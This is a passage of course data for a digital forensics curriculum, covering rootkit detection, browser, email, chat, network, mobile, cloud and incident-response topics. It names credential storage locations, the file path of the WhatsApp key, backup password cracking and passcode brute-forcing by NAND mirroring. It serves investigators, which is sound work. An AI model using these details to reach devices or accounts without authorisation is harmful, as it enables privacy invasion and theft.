          'Techniques for detecting rootkits, code injection, API hooking, and other advanced evasion techniques through memory forensics analysis.',
        keyPoints: [
          'DKOM (Direct Kernel Object Manipulation): rootkits unlink their process EPROCESS structure from the kernel\'s process list — psscan detects these because it scans raw memory rather than walking the list',
          'SSDT (System Service Descriptor Table) hooking: rootkits redirect system calls to malicious handlers — the ssdt plugin compares hook targets against known-good kernel module address ranges',
          'IDT (Interrupt Descriptor Table) hooking: rootkits modify interrupt handlers to intercept hardware and software interrupts — deviations from expected handler addresses indicate tampering',
          'Inline hooking (IAT/EAT patching): malware modifies the first bytes of API functions to redirect execution to malicious code — detectable by comparing in-memory function prologues against on-disk originals',
          'Process hollowing: malware creates a legitimate process in a suspended state, replaces its memory with malicious code, then resumes execution — detectable by comparing the in-memory PE image against the on-disk executable',
        ],
        tradeoffs: [
          'Rootkit detection requires deep OS kernel knowledge — false positives are common because security products and system updates also modify kernel structures',
          'Advanced rootkits target the hypervisor level (blue pill attacks) or firmware — memory forensics alone cannot detect these; hardware-based attestation is needed',
          'Memory forensics captures a point-in-time snapshot — transient attacks that execute and clean up quickly may not be present when memory is captured',
        ],
        realWorld: [
          'The TDL4/TDSS bootkit modified the MBR and operated below the OS — memory forensics combined with MBR analysis was required for detection',
          'Turla (APT group) uses sophisticated kernel-mode rootkits that hook NDIS (network driver) to hide network traffic — Volatility\'s netscan and network-related plugins help detect anomalous connections',
          'GhostHook: a technique that abuses Intel Processor Trace to inject code into the kernel without modifying protected structures — demonstrated the limitations of current rootkit detection methods',
          'The Volatility plugins check_idt, check_ssdt, and check_modules (Linux) automate detection of common kernel hooking and module hiding techniques',
        ],
      },
    ],
  },
  {
    id: 7,
    title: 'Browser & Application Forensics',
    part: 2,
    partTitle: 'System Forensics',
    summary:
      'Extracting and analyzing evidence from web browsers, email clients, and messaging applications to reconstruct user activity and communication patterns.',
    concepts: [
      {
        id: '7-1',
        name: 'Browser Artifact Analysis (History, Cache, Cookies, Downloads)',
        description:
          'Web browsers store extensive user activity data in local databases and files — browsing history, cached content, cookies, and download records provide detailed evidence of online activity.',
        keyPoints: [
          'Chrome/Edge (Chromium-based): artifacts stored in SQLite databases — History (urls, visits, downloads tables), Cookies, Login Data, Web Data (autofill), and Bookmarks in ~/AppData/Local/Google/Chrome/User Data/Default/',
          'Firefox: similar SQLite databases — places.sqlite (history, bookmarks), cookies.sqlite, formhistory.sqlite, and logins.json (saved passwords encrypted with NSS) in the profile directory',
          'Browser cache: stores copies of downloaded web resources (images, scripts, HTML) — can prove that specific content was viewed even if history was cleared; Chrome uses a custom cache format, Firefox uses cache2',
          'Session restore files: Chrome Session and Tabs files and Firefox sessionstore.jsonlz4 record open tabs and recently closed tabs — can reveal browsing activity even across browser crashes',
          'IndexedDB and Local Storage: modern web applications store structured data client-side — chat applications, webmail, and social media sites may store message content and user data in these browser databases',
        ],
        tradeoffs: [
          'Browser artifacts are easy to destroy (clear browsing data, private/incognito mode) — but cache, prefetch, and DNS cache may retain evidence even after clearing',
          'SQLite databases support WAL (Write-Ahead Logging) mode — the WAL file may contain recently deleted records that are not yet committed to the main database, providing a recovery opportunity',
          'Incognito/private browsing prevents local artifact creation but does not prevent network-level logging (DNS, proxy logs, NetFlow) — the absence of local artifacts combined with network evidence is itself probative',
        ],
        realWorld: [
          'Hindsight (Obsidian Security): open-source tool specifically designed for Chrome/Chromium browser forensics — parses history, cache, cookies, downloads, and preferences with timeline output',
          'KAPE (Kroll Artifact Parser and Extractor) includes browser artifact collection targets and processing modules that automatically extract and parse all major browser databases',
          'In the Silk Road investigation, browser artifacts (Tor Browser configuration, local Bitcoin wallet data, and browsing history on a laptop seized at a public library) helped link Ross Ulbricht to the Dread Pirate Roberts identity',
          'DB Browser for SQLite: a GUI tool used by forensic examiners to manually query and explore browser SQLite databases when automated tools miss edge cases',
        ],
      },
      {
        id: '7-2',
        name: 'Email Header Analysis & Metadata Extraction',
        description:
          'Email headers contain detailed routing and authentication metadata that can trace the origin and path of messages, reveal spoofing attempts, and establish communication timelines.',
        keyPoints: [
          'Received headers: each mail server that processes a message adds a "Received:" header at the top — reading from bottom to top traces the message path from sender to recipient, revealing originating IP addresses',
          'Authentication headers: SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication) results indicate whether the sender is authorized — "spf=fail" or "dkim=fail" suggests spoofing',
          'X-Originating-IP: some mail services (Outlook.com, Yahoo) include the sender\'s actual IP address in this header — valuable for geolocation and attribution',
          'Message-ID and References/In-Reply-To headers: uniquely identify messages and establish conversation threading — useful for reconstructing communication chains even from partial evidence',
          'Email file formats: PST (Outlook), MBOX (Unix/Thunderbird), EML (individual messages), and OST (offline Outlook cache) — each requires specific parsing tools; PST files can contain deleted messages recoverable from internal free space',
        ],
        tradeoffs: [
          'Email headers can be partially forged by the sender — only "Received:" headers added by your own mail infrastructure are trustworthy; earlier hops may be fabricated',
          'Cloud email (Gmail, O365) reduces local artifacts — investigation may require legal process (subpoena/warrant) to obtain server-side data from the provider',
          'Email metadata analysis reveals communication patterns (who, when, how often) even when message content is encrypted — this metadata can be as valuable as content for investigations',
        ],
        realWorld: [
          'MXToolbox Header Analyzer: online tool for parsing and visualizing email headers — commonly used for quick analysis during phishing investigations',
          'libpff/pffexport: open-source tools for parsing Outlook PST and OST files — extract messages, attachments, and metadata for forensic analysis',
          'In business email compromise (BEC) investigations, email header analysis reveals the attacker\'s spoofed domain, the actual sending IP, and the mail service used — critical for attribution and takedown',
          'The Podesta email hack (2016): email header analysis and Google account security notifications were used to trace the phishing attack to specific infrastructure',
        ],
      },
      {
        id: '7-3',
        name: 'Chat & Social Media Forensics',
        description:
          'Forensic analysis of instant messaging applications, social media platforms, and collaboration tools to recover communications, shared media, and user activity.',
        keyPoints: [
          'WhatsApp: stores messages in an encrypted SQLite database (msgstore.db.crypt14/15) on Android — decryption requires the key from /data/data/com.whatsapp/files/key or a Google Drive backup token',
          'Telegram: cloud-based messages require server-side access, but "secret chats" (end-to-end encrypted) are stored locally on the device — cache_4.db on Android contains cached message data',
          'Signal: designed for minimal forensic artifacts — messages stored in an encrypted SQLite database, disappearing messages leave minimal traces, but notification logs and contact data may persist on the device',
          'Slack/Teams/Discord: enterprise collaboration tools store data server-side — forensic collection typically requires admin access, legal holds, or eDiscovery exports; local cache and IndexedDB in desktop apps may contain partial data',
          'Social media metadata: posts, comments, likes, and shares include timestamps, geolocation (if enabled), device information, and IP logs — platforms comply with legal process to provide this data',
        ],
        tradeoffs: [
          'End-to-end encrypted messaging (Signal, WhatsApp) makes server-side interception infeasible — forensic access requires physical device access or backup access',
          'Cloud-based platforms (Slack, Teams) simplify server-side collection through legal process but local artifacts on endpoint devices are typically minimal and fragmented',
          'Ephemeral messages (Snapchat, Signal disappearing messages) create a forensic challenge — but notification databases, screenshots, and recipient device artifacts may preserve evidence',
        ],
        realWorld: [
          'Cellebrite UFED and Magnet AXIOM include parsers for 800+ mobile applications — automatically extracting chat databases, media, and metadata from device acquisitions',
          'In drug trafficking investigations, WhatsApp message recovery from Android devices frequently provides evidence of communication between suspects — even deleted messages can be recovered from the SQLite WAL file',
          'Bellingcat\'s open-source investigations combine social media metadata (geolocation from photos, timestamp analysis, account creation dates) with other OSINT to attribute activity to specific individuals',
          'Oxygen Forensic Detective specializes in cloud data extraction — with proper credentials or tokens, it can acquire data from iCloud, Google, Facebook, Instagram, and other cloud services',
        ],
      },
    ],
  },

  // Part 3: Network & Mobile
  {
    id: 8,
    title: 'Network Forensics',
    part: 3,
    partTitle: 'Network & Mobile',
    summary:
      'Capturing, analyzing, and reconstructing network traffic to detect attacks, trace data exfiltration, and understand communication patterns.',
    concepts: [
      {
        id: '8-1',
        name: 'Packet Capture & pcap Analysis (Wireshark, tcpdump)',
        description:
          'Full packet capture records every byte of network traffic for later forensic analysis — the foundation of network forensics.',
        keyPoints: [
          'tcpdump: command-line packet capture tool — "tcpdump -i eth0 -w capture.pcap" captures all traffic on an interface; BPF (Berkeley Packet Filter) syntax enables targeted capture (e.g., "host 192.168.1.1 and port 443")',
          'Wireshark: GUI-based packet analyzer with deep protocol dissection — follow TCP/UDP streams to reconstruct conversations, extract transferred files, and decode application-layer protocols',
          'pcap/pcapng formats: pcap is the classic format; pcapng adds per-packet comments, interface metadata, name resolution, and multiple capture interfaces in one file — pcapng is now the default in Wireshark',
          'Capture strategies: full packet capture preserves complete content but requires massive storage (1 Gbps = ~450 GB/hour); header-only capture reduces storage but loses payload content',
          'Packet capture placement: TAP (Test Access Point) devices provide a passive copy of network traffic without affecting the network — preferred over SPAN/mirror ports which can drop packets under load',
        ],
        tradeoffs: [
          'Full packet capture provides complete forensic evidence but generates enormous data volumes — most organizations can only retain full capture for days to weeks',
          'Encrypted traffic (TLS 1.3) is opaque to content inspection — without TLS decryption keys (SSLKEYLOGFILE, HSM access), only metadata (SNI, JA3/JA4 fingerprints, certificate details) is available',
          'Real-time capture must keep pace with network speed — high-speed networks (10+ Gbps) require specialized hardware or tools like Moloch/Arkime for efficient capture and indexing',
        ],
        realWorld: [
          'Arkime (formerly Moloch): open-source full packet capture and search system — indexes pcap files and provides a web interface for searching, session reconstruction, and analysis at scale',
          'NetworkMiner: open-source network forensics tool that extracts files, images, and credentials from pcap files — useful for quickly reconstructing transferred content',
          'In the Target data breach (2013), network forensics revealed that attackers exfiltrated 40 million credit card records through a connection to an external FTP server — captured traffic showed the data in transit',
          'SANS Security Onion: a Linux distribution that integrates Suricata, Zeek, and Arkime for comprehensive network security monitoring and forensics',
        ],
      },
      {
        id: '8-2',
        name: 'NetFlow & Traffic Metadata Analysis',
        description:
          'Network flow data summarizes communication patterns (who talked to whom, when, how much) without capturing full packet content — essential for large-scale network forensics.',
        keyPoints: [
          'NetFlow/IPFIX records: each flow record contains source/destination IP and port, protocol, byte/packet counts, timestamps (start/end), TCP flags, and TOS — routers and switches generate these natively',
          'Zeek (formerly Bro): a network analysis framework that generates detailed connection logs (conn.log), DNS queries (dns.log), HTTP requests (http.log), TLS metadata (ssl.log), and file identification (files.log)',
          'Flow analysis detects: data exfiltration (large outbound transfers to unusual destinations), lateral movement (internal host scanning patterns), beaconing (periodic connections to C2 servers), and DNS tunneling (high-volume DNS queries to a single domain)',
          'Long-term retention: flow data is ~500x smaller than full packet capture — organizations can retain months or years of flow data for historical investigation and threat hunting',
          'JA3/JA4 fingerprinting: hashes of TLS Client Hello parameters (cipher suites, extensions, curves) that fingerprint client applications — malware families have consistent JA3 hashes even when domains change',
        ],
        tradeoffs: [
          'Flow data reveals communication patterns but not content — it answers "who talked to whom and how much" but not "what was said"',
          'Zeek logs provide richer metadata than raw NetFlow (e.g., HTTP headers, DNS responses, TLS certificates) but require more processing power and storage',
          'Sampled NetFlow (1:100 or 1:1000 sampling) reduces router CPU load but can miss low-volume connections — unsampled flow is preferred for forensics but may not be feasible at high traffic volumes',
        ],
        realWorld: [
          'Zeek connection logs (conn.log) are a primary data source for security operations centers (SOCs) — fields include duration, originator bytes, responder bytes, connection state, and history flags',
          'SiLK (System for Internet-Level Knowledge): a suite of NetFlow analysis tools from CERT/CC — enables large-scale flow analysis for network forensics and security research',
          'In APT investigations, NetFlow analysis reveals attacker lateral movement patterns — internal connections from a compromised host to other hosts on unusual ports indicate pivoting',
          'Cisco Stealthwatch (now Secure Network Analytics) uses NetFlow data to detect anomalies, insider threats, and encrypted malware communications without decryption',
        ],
      },
      {
        id: '8-3',
        name: 'Protocol Reconstruction & Encrypted Traffic Analysis',
        description:
          'Techniques for reconstructing application-layer protocols from captured traffic and extracting forensic value from encrypted communications.',
        keyPoints: [
          'TCP stream reassembly: Wireshark\'s "Follow TCP Stream" feature reassembles the complete application-layer conversation from individual packets — essential for reconstructing HTTP, SMTP, FTP, and other cleartext protocols',
          'File extraction from pcap: tools like NetworkMiner, Wireshark export objects, and Zeek file extraction identify and reassemble transferred files (documents, images, executables) from captured traffic',
          'DNS forensics: DNS queries and responses reveal domain lookups — DNS tunneling uses TXT/CNAME records for covert data exfiltration; long, high-entropy subdomain names are a strong indicator',
          'TLS metadata analysis: even without decryption, the Server Name Indication (SNI), certificate subject/issuer, JA3/JA4 fingerprints, and certificate transparency logs provide attribution and classification information',
          'Encrypted traffic analysis (ETA): machine learning techniques classify encrypted traffic by analyzing packet sizes, inter-arrival times, and flow patterns — can detect malware C2 without decryption',
        ],
        tradeoffs: [
          'Protocol reconstruction works well for cleartext protocols but is increasingly limited as the internet moves to ubiquitous encryption (TLS 1.3, QUIC, DNS-over-HTTPS)',
          'TLS interception (man-in-the-middle proxies) enables content inspection but breaks end-to-end security and may not be legally permissible without proper authorization',
          'Encrypted DNS (DoH/DoT) prevents passive DNS monitoring — organizations must either deploy DNS proxies or rely on endpoint-level DNS logging',
        ],
        realWorld: [
          'Wireshark dissectors: Wireshark supports 3000+ protocol dissectors — custom dissectors can be written in Lua for proprietary protocols encountered during investigations',
          'Zeek\'s file extraction and analysis framework identifies files transferred over HTTP, FTP, SMTP, and other protocols — computes hashes for IOC matching and can submit to sandboxes',
          'In the APT1/Comment Crew report (Mandiant, 2013), network forensics including protocol reconstruction and C2 traffic analysis was central to attributing attacks to a specific PLA unit',
          'JA3 fingerprints are integrated into Zeek, Suricata, and many commercial tools — security teams maintain lists of known-malicious JA3 hashes for detection',
        ],
      },
    ],
  },
  {
    id: 9,
    title: 'Mobile Forensics',
    part: 3,
    partTitle: 'Network & Mobile',
    summary:
      'Acquisition and analysis of evidence from iOS and Android mobile devices, including extraction methods, platform-specific artifacts, and the unique challenges of mobile forensics.',
    concepts: [
      {
        id: '9-1',
        name: 'Mobile Acquisition Methods (logical, file system, physical)',
        description:
          'The hierarchy of mobile device acquisition methods, ranging from least invasive (and least complete) to most invasive (and most complete).',
        keyPoints: [
          'Logical acquisition: extracts data accessible through the device\'s standard interfaces (APIs, backup protocols) — includes contacts, messages, call logs, and media but misses deleted data and app-internal databases',
          'File system acquisition: extracts the complete file system — provides access to application databases (SQLite), configuration files, caches, and temporary files that contain significantly more evidence than logical extraction',
          'Physical acquisition: bit-for-bit copy of the device\'s flash storage (NAND) — captures everything including deleted data, unallocated space, and data not accessible through the file system; requires bypassing device security',
          'Chip-off: physically removing the NAND flash chip from the device and reading it directly — destructive, last-resort technique used when software-based acquisition fails; requires specialized equipment and expertise',
          'Cloud acquisition: extracting data synced to cloud services (iCloud, Google Account) using valid credentials or tokens — provides access to backups, photos, contacts, and app data without physical device access',
        ],
        tradeoffs: [
          'Physical acquisition provides the most complete evidence but is increasingly difficult due to hardware encryption (iPhone Secure Enclave, Android hardware-backed keystore) and locked bootloaders',
          'Logical acquisition is the least invasive and fastest but captures only a subset of available data — it is often the starting point and may be sufficient for many investigations',
          'Cloud acquisition can provide extensive data without physical device access but requires valid credentials or legal process to the cloud provider — and cloud data may differ from on-device data',
        ],
        realWorld: [
          'Cellebrite UFED: the most widely used mobile forensic tool — supports logical, file system, and physical acquisition for thousands of device models across iOS and Android',
          'GrayKey (Grayshift): specializes in iOS device unlocking and acquisition — uses undisclosed vulnerabilities to bypass passcode protection on locked iPhones',
          'MSAB XRY: mobile forensic tool focused on reliability and court acceptance — supports logical and physical extraction with automatic decoding of application data',
          'The San Bernardino iPhone case (2016): FBI\'s request to Apple to unlock an iPhone 5c highlighted the tension between law enforcement access and device security',
        ],
      },
      {
        id: '9-2',
        name: 'iOS Forensics (backups, keychain, plists)',
        description:
          'Forensic analysis of Apple iOS devices, leveraging backups, the keychain, property list files, and iOS-specific databases to recover user data and activity.',
        keyPoints: [
          'iTunes/Finder backups: stored in ~/Library/Application Support/MobileSync/Backup/ (macOS) — contain SMS/iMessage databases, call history, contacts, photos, and application data; encrypted backups additionally include keychain data and health data',
          'iOS Keychain: stores passwords, Wi-Fi credentials, VPN configurations, and authentication tokens — accessible from encrypted backups or physical/file system acquisitions; items are protected by different accessibility classes (e.g., kSecAttrAccessibleAfterFirstUnlock)',
          'Property list files (.plist): XML or binary configuration files used throughout iOS — contain application settings, user preferences, account information, and sometimes cached credentials',
          'SQLite databases: iOS stores most structured data in SQLite — sms.db (messages), call_history.db (calls), AddressBook.sqlitedb (contacts), photos.sqlite (photo metadata), and consolidated.db (historical location data)',
          'iOS file system artifacts: /private/var/mobile/ contains user data, /private/var/log/ contains system logs (crashlogs, diagnostic data), and /private/var/wireless/Library/Databases/CellularUsage.db tracks cellular data usage per app',
        ],
        tradeoffs: [
          'Encrypted iTunes backups contain more data (keychain, health data) than unencrypted backups — but require the backup password; tools like hashcat can attempt to crack the password if unknown',
          'Full file system access on modern iOS requires a jailbreak or exploit — each iOS version may require different techniques, and jailbreaking can alter data',
          'iCloud backups are convenient for remote acquisition but Apple\'s Advanced Data Protection (ADP) uses end-to-end encryption, making server-side access impossible without the user\'s device',
        ],
        realWorld: [
          'iLEAPP (iOS Logs, Events, and Plists Parser) by Alexis Brignoni: open-source tool that parses 200+ iOS artifact types from file system extractions and backups',
          'libimobiledevice: open-source library for communicating with iOS devices — enables backup acquisition, file system access, and service communication without proprietary tools',
          'The NAND mirroring technique (demonstrated in the San Bernardino case context) copies the flash storage to reset the attempt counter — allowing unlimited passcode brute-force attempts on older devices',
          'Elcomsoft Phone Breaker: extracts and decrypts iOS backups, iCloud backups, and iCloud Keychain — supports password recovery and authentication token extraction',
        ],
      },
      {
        id: '9-3',
        name: 'Android Forensics (ADB, SQLite databases, app data)',
        description:
          'Forensic analysis of Android devices, leveraging ADB access, SQLite databases, application data directories, and Android-specific artifacts.',
        keyPoints: [
          'ADB (Android Debug Bridge): provides command-line access to the device — "adb backup" creates a logical backup, "adb pull" extracts specific files, and "adb shell" enables direct file system access (root access dramatically expands what is accessible)',
          'Android data directories: each app stores data in /data/data/[package.name]/ — databases/ contains SQLite databases, shared_prefs/ contains XML preferences, cache/ contains temporary data, and files/ contains app-specific files',
          'SQLite databases of interest: contacts2.db (contacts), mmssms.db (SMS/MMS), telephony.db (call log), external.db (media metadata), and browser databases in each browser\'s data directory',
          'Android system artifacts: /data/system/users/0/settings_secure.xml (security settings), /data/misc/wifi/WifiConfigStore.xml (saved Wi-Fi networks and passwords), and /data/system/packages.xml (installed app inventory with permissions)',
          'Android partition structure: boot, system, vendor, data (user data), cache, and recovery partitions — the data partition contains user-generated content and is the primary forensic target',
        ],
        tradeoffs: [
          'ADB access requires USB debugging to be enabled on the device — if disabled and the device is locked, physical acquisition or exploit-based techniques are needed',
          'Android fragmentation means forensic procedures vary significantly across manufacturers (Samsung, Pixel, Xiaomi) and Android versions — tool compatibility is an ongoing challenge',
          'Full Disk Encryption (FDE) on older Android and File-Based Encryption (FBE) on modern Android protect data at rest — acquisition of encrypted data without the user credentials or decryption key yields encrypted content',
        ],
        realWorld: [
          'ALEAPP (Android Logs, Events, and Protobuf Parser) by Alexis Brignoni: open-source tool that parses 200+ Android artifact types from file system extractions',
          'Magnet AXIOM: commercial tool that supports Android logical, file system, and physical acquisition with automatic artifact parsing and timeline generation',
          'Samsung devices store additional artifacts in /data/log/ and the Knox security container — Samsung-specific knowledge is essential for thorough forensic examination',
          'In many criminal investigations, deleted WhatsApp messages on Android are recovered from the msgstore.db WAL (Write-Ahead Log) file or from unallocated space on the device storage',
        ],
      },
    ],
  },
  {
    id: 10,
    title: 'Cloud & Container Forensics',
    part: 3,
    partTitle: 'Network & Mobile',
    summary:
      'Forensic investigation in cloud environments and containerized infrastructure, addressing the unique challenges of ephemeral resources, shared responsibility, and distributed evidence.',
    concepts: [
      {
        id: '10-1',
        name: 'Cloud Log Sources (CloudTrail, Azure Activity, GCP Audit)',
        description:
          'Cloud platforms provide extensive logging capabilities that serve as the primary evidence sources for cloud forensic investigations.',
        keyPoints: [
          'AWS CloudTrail: logs every API call made in an AWS account — who did what, when, from which IP address, and what resources were affected; management events (console/API actions) and data events (S3 object access, Lambda invocations) are logged separately',
          'Azure Activity Log and Azure Monitor: Activity Log records subscription-level events (resource creation, deletion, modifications); Azure Monitor captures diagnostic logs, metrics, and Azure AD sign-in logs with conditional access results',
          'GCP Cloud Audit Logs: Admin Activity logs (always on, 400-day retention), Data Access logs (configurable, track data reads/writes), System Event logs (Google-initiated actions), and Policy Denied logs (security policy violations)',
          'VPC Flow Logs (AWS/Azure/GCP): record network traffic metadata (source/dest IP, ports, protocol, bytes, action) for virtual network interfaces — essential for detecting lateral movement and data exfiltration in cloud environments',
          'Cloud log aggregation: centralize logs in SIEM (Splunk, Elastic, Sentinel) or a dedicated bucket/storage account — ensures logs survive account compromise and enables cross-account correlation',
        ],
        tradeoffs: [
          'Cloud logs are generated by the provider and are generally trustworthy (the customer cannot fabricate them), but log completeness depends on configuration — data events and VPC Flow Logs must be explicitly enabled',
          'Default log retention varies (CloudTrail: 90 days in Event History, Azure Activity: 90 days, GCP Admin Activity: 400 days) — long-term retention requires explicit configuration to S3/Blob Storage/GCS',
          'Multi-region and multi-account environments multiply the complexity — investigators must ensure they are collecting logs from all regions and accounts, not just the one where the incident was detected',
        ],
        realWorld: [
          'The Capital One breach (2019): AWS CloudTrail logs showed the attacker\'s API calls using stolen IAM role credentials — the SSRF attack against a misconfigured WAF was traced through EC2 metadata service calls in CloudTrail',
          'AWS GuardDuty uses CloudTrail, VPC Flow Logs, and DNS logs to automatically detect anomalous activity — findings serve as starting points for forensic investigation',
          'Invictus Incident Response publishes cloud forensic investigation frameworks and tools — their blog details practical approaches to AWS, Azure, and GCP forensic investigations',
          'Prowler (AWS) and ScoutSuite (multi-cloud): open-source tools that audit cloud security configurations — while primarily security tools, they help forensic investigators understand the environment during an investigation',
        ],
      },
      {
        id: '10-2',
        name: 'Container & Kubernetes Forensics',
        description:
          'Forensic analysis of containerized environments introduces unique challenges: short-lived containers, shared kernel, layered file systems, and orchestration complexity.',
        keyPoints: [
          'Docker forensics: containers use layered file systems (OverlayFS) — "docker diff" shows file changes in the container layer, "docker export" captures the current file system, and /var/lib/docker/ contains image layers, container metadata, and volumes',
          'Kubernetes audit logs: record all API server requests — who created/deleted pods, modified deployments, or accessed secrets; audit policy controls which events are logged at what verbosity level',
          'Container image analysis: "docker history" and "docker inspect" reveal the build layers and configuration; Dive (tool) visualizes layer contents — malicious images may contain backdoors or cryptocurrency miners in hidden layers',
          'Runtime evidence: container logs ("docker logs" / "kubectl logs"), process lists at time of incident, and the container\'s writable layer contain the primary forensic evidence — capture these before the container is destroyed',
          'Ephemeral nature: containers may exist for seconds to hours — forensic readiness requires proactive log forwarding (Fluentd, Filebeat), runtime security monitoring (Falco, Sysdig), and the ability to pause rather than kill suspicious containers',
        ],
        tradeoffs: [
          'Containers share the host kernel — a compromised container may affect host-level evidence, and host-level forensics may reveal evidence from multiple containers that is difficult to attribute',
          'Immutable infrastructure (containers are replaced, not patched) means evidence is destroyed when containers are restarted or rescheduled — forensic capture must happen before orchestration replaces the compromised container',
          'Container orchestration (Kubernetes) adds abstraction layers — mapping a malicious process to a specific pod, deployment, and namespace requires correlating multiple log sources',
        ],
        realWorld: [
          'Falco (CNCF): runtime security tool that monitors Linux syscalls in containers — detects anomalous behavior (shell spawned in container, sensitive file access, outbound connections) and generates alerts for forensic investigation',
          'Sysdig Secure: commercial container forensics platform that captures container activity for forensic analysis — provides activity timelines and file system snapshots for incident investigation',
          'The Tesla Kubernetes cryptomining incident (2018): attackers accessed an unsecured Kubernetes dashboard and deployed cryptocurrency mining containers — detected through abnormal resource usage patterns',
          'kube-forensics (Keikoproj): open-source tool that creates forensic snapshots of running Kubernetes pods — captures the pod\'s file system and metadata for offline analysis',
        ],
      },
      {
        id: '10-3',
        name: 'Ephemeral Evidence & Serverless Challenges',
        description:
          'The forensic challenges posed by ephemeral cloud resources — serverless functions, auto-scaling instances, and spot instances that disappear without trace unless proactive measures are taken.',
        keyPoints: [
          'Serverless forensics (AWS Lambda, Azure Functions, GCP Cloud Functions): no persistent infrastructure — the execution environment is created, runs, and is destroyed; evidence exists only in function logs (CloudWatch, Application Insights) and the invocation API logs',
          'Auto-scaling and spot instances: instances are created and terminated automatically — disk contents are lost on termination unless EBS volumes are preserved; forensic readiness requires snapshot automation and log forwarding before termination',
          'Infrastructure as Code (IaC) forensics: Terraform state files, CloudFormation stacks, and Pulumi state record the intended infrastructure configuration — comparing actual state to IaC reveals unauthorized modifications',
          'Shared responsibility model: cloud providers manage infrastructure security (physical, hypervisor) while customers manage application and data security — forensic evidence availability depends on which party controls the relevant layer',
          'Evidence preservation in cloud: AWS EC2 snapshots, Azure VM snapshots, and GCP persistent disk snapshots provide point-in-time disk copies — create snapshots immediately when an incident is detected, before auto-scaling terminates the instance',
        ],
        tradeoffs: [
          'Serverless architecture dramatically reduces the attack surface and forensic evidence simultaneously — you cannot image a Lambda function\'s "disk" because there is no persistent disk',
          'Proactive forensic readiness (log forwarding, snapshot automation, runtime monitoring) adds cost and complexity but is the only way to ensure evidence exists when needed',
          'Cloud provider logs are invaluable but are under the provider\'s control — in multi-tenant investigations, the provider may limit the scope of evidence they share',
        ],
        realWorld: [
          'AWS Incident Response playbooks (available in the AWS Well-Architected Framework) include procedures for isolating compromised EC2 instances, creating forensic snapshots, and preserving CloudTrail logs',
          'GRR Rapid Response (Google): open-source incident response framework that enables remote forensic data collection from cloud-hosted Linux and Windows systems at scale',
          'The Codecov supply chain attack (2021): attackers modified a CI/CD script to exfiltrate environment variables — detection required forensic analysis of CI/CD logs and Docker image layer comparisons over time',
          'Cado Security: a cloud-native forensics platform that automates evidence collection across AWS, Azure, and GCP — captures disk, memory, and log data from ephemeral cloud resources',
        ],
      },
    ],
  },

  // Part 4: Advanced Topics
  {
    id: 11,
    title: 'Incident Response Process',
    part: 4,
    partTitle: 'Advanced Topics',
    summary:
      'The structured approach to detecting, containing, eradicating, and recovering from security incidents, including triage frameworks and post-incident analysis.',
    concepts: [
      {
        id: '11-1',
        name: 'PICERL Framework & IR Lifecycle',
        description:
          'The six-phase incident response lifecycle (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned) that provides a structured approach to handling security incidents.',
        keyPoints: [
          'Preparation: establishing an IR team, defining roles and communication plans, deploying detection tools (SIEM, EDR), creating playbooks, and conducting tabletop exercises — the most important phase because it determines readiness',
          'Identification: detecting that an incident has occurred through alerts (SIEM, EDR, IDS), user reports, or threat hunting — the goal is to determine the scope, nature, and severity of the incident',
          'Containment: stopping the spread of the incident — short-term containment (isolating affected hosts, blocking C2 IPs) and long-term containment (applying patches, changing credentials) while preserving evidence',
          'Eradication: removing the threat from the environment — deleting malware, closing vulnerabilities, removing persistence mechanisms, and verifying that all affected systems are clean',
          'Recovery and Lessons Learned: restoring systems to normal operation with monitoring for re-compromise, followed by a blameless post-mortem documenting what happened, what was done, what worked, and what to improve',
        ],
        tradeoffs: [
          'Containment must balance speed against evidence preservation — immediately reimaging a compromised system stops the attack but destroys forensic evidence; isolating the system preserves both',
          'Aggressive containment (network isolation) may alert the attacker and cause them to accelerate destructive actions (ransomware deployment, data destruction) or establish alternative persistence',
          'The PICERL framework is sequential in theory but iterative in practice — new information discovered during containment may require returning to identification to reassess scope',
        ],
        realWorld: [
          'NIST SP 800-61 (Computer Security Incident Handling Guide): the authoritative reference for incident response, defining the lifecycle and providing detailed guidance for each phase',
          'SANS Incident Handler\'s Handbook: practical guide with checklists and templates for each PICERL phase — widely used in IR training and certification',
          'The Colonial Pipeline ransomware incident (2021): demonstrated the critical importance of IR preparation — the company paid a $4.4M ransom within hours because incident response procedures were insufficient to restore operations quickly',
          'Mandiant\'s incident response engagements typically follow PICERL but emphasize "scoping" (determining the full extent of compromise) as a critical sub-phase of Identification',
        ],
      },
      {
        id: '11-2',
        name: 'Triage & Containment Strategies',
        description:
          'Rapid assessment and prioritization of security incidents, followed by strategic containment actions to limit damage while preserving evidence.',
        keyPoints: [
          'Triage priorities: determine (1) is this a true positive? (2) what is the scope of compromise? (3) is data exfiltration ongoing? (4) what is the business impact? — these questions drive the urgency and resource allocation',
          'Network containment: isolate compromised hosts at the switch/firewall level (VLAN isolation, ACLs), block known C2 IP addresses and domains at the perimeter, and implement DNS sinkholing for malicious domains',
          'Endpoint containment: use EDR tools (CrowdStrike, SentinelOne, Defender for Endpoint) to isolate hosts from the network while maintaining management connectivity — preserves the ability to investigate remotely',
          'Credential containment: reset compromised accounts, revoke active sessions and tokens, rotate service account credentials, and enforce MFA — credential compromise is often the most critical vector to contain',
          'Evidence preservation during triage: create forensic images or snapshots before destructive containment actions, capture volatile data (memory, network connections, running processes) first, and document every action taken',
        ],
        tradeoffs: [
          'Fast containment minimizes damage but risks alerting the attacker — in advanced persistent threats, stealth containment (monitoring while preparing coordinated action) may be more effective',
          'Isolating a production server stops the attack but may cause business disruption — the IR team must weigh security impact against business impact with executive input',
          'Broad containment (isolating an entire network segment) is safer but affects legitimate users and operations; targeted containment (isolating specific hosts) is less disruptive but risks missing compromised systems',
        ],
        realWorld: [
          'CrowdStrike Falcon\'s "contain host" feature isolates an endpoint from the network while maintaining the cloud management channel — enabling remote investigation of a contained system',
          'During the NotPetya attack (2017), Maersk\'s IT team physically disconnected servers from the network to stop the spread — an extreme but effective containment measure that saved some systems',
          'CISA\'s "Shields Up" guidance recommends pre-positioning containment capabilities: pre-authorized firewall rules, network segmentation plans, and documented procedures for rapid credential rotation',
          'In ransomware incidents, the first triage question is whether encryption is still spreading — if yes, immediate network isolation takes priority over evidence preservation',
        ],
      },
      {
        id: '11-3',
        name: 'IOC Extraction & Post-Incident Analysis',
        description:
          'Extracting Indicators of Compromise (IOCs) from forensic evidence, sharing threat intelligence, and conducting thorough post-incident analysis to prevent recurrence.',
        keyPoints: [
